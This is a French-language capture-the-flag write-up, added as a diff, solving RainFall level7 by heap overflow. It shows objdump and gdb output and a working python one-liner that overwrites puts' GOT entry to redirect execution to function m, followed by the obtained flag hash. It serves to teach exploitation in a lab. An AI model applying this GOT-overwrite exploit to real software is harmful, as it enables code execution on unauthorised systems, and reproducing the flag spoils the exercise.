@@ -1,0 +1,69 @@
+---------> Alors apres moult test jai compris qu'il fallait comme l'exercice precedent modifier
+---------> l'appel a <puts>.
+---------> On check la GoT:
+level7@RainFall:~$ objdump -R ./level7
+
+./level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+
+---------> On va devoir ecrire l'adresse de la fonction <m>, 0x080484f4 a la place de <puts>.
+---------> Pour cela on va devoir exploiter les strcpy(). Plus precisement on va reecrire
+---------> l'adresse de str2 pour que strcpy(str2, av[2]) ecrive 0x080484f4 en 0x08049928.
+---------> Debug avec GDB pour voir ce qui se passe en memoire:
+$ gdb ./level7
+(gdb) b *0x080485c2		<- breakpoint juste apres le 2nd strcpy
+(gdb) r AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB
+
+---------> Avec objdump -d on remarque que:
+...
+   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
+   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
+...
+   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
+   0x08048565 <+68>:	mov    %eax,0x18(%esp)
+
+---------> On stoque les deux retours de malloc, respectivement, en esp+0x1c et esp+0x18
+(gdb) x/10x $esp
+0xbffff700:	0x0804a038	0xbffff908	0xb7fd0ff4	0xb7e5ee55
+0xbffff710:	0xb7fed280	0x00000000	0x0804a028	0x0804a008
+0xbffff720:	0x08048610	0x00000000
+
+--------> "ptr1" et "ptr3" se trouve donc en 0x804a008 et 0x804a028.
+--------> Regardons ce qu'il se passe en memoire (apres les 2 strcpy):
+(gdb) c
+(gdb) x/30x 0x804a008
+0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
+0x804a018:	0x41414141	0x41414141	0x00000000	0x00000011
+0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
+0x804a038:	0x42424242	0x42424242	0x00000000	0x00020fc1
+0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a078:	0x00000000	0x00000000
+
+---------> On remarque quoi ?
+---------> Qu'apres le 1er strcpy, precisement 20 octets plus loin se trouve l'adresse de "str2" (!!!).
+---------> Donc si on ecrit 20 "A" + l'adresse de <puts> et qu'en deuxieme parametres on ecrit
+---------> l'adresse de <m>, au moment de l'appel de <puts>, <m> sera appeler !!!
+---------> On essaye:
+---------> 08049928 R_386_JUMP_SLOT   puts
+---------> 080484f4 <m>:
+(gdb) q
+$ ./level7 `python -c 'print "A"*20 + "\x08\x04\x99\x28"[::-1] + " " + "\x08\x04\x84\xf4"[::-1]'`
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1496547211
+
+
+bingo. !
